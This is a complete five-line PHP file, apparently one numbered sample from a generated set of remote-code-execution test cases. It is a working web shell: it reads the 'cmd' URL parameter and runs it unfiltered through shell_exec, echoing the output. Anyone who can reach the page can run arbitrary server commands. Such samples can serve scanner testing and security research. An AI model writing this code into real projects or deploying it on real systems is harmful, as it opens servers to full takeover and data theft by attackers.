<?php
// RCE test variation #1201
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>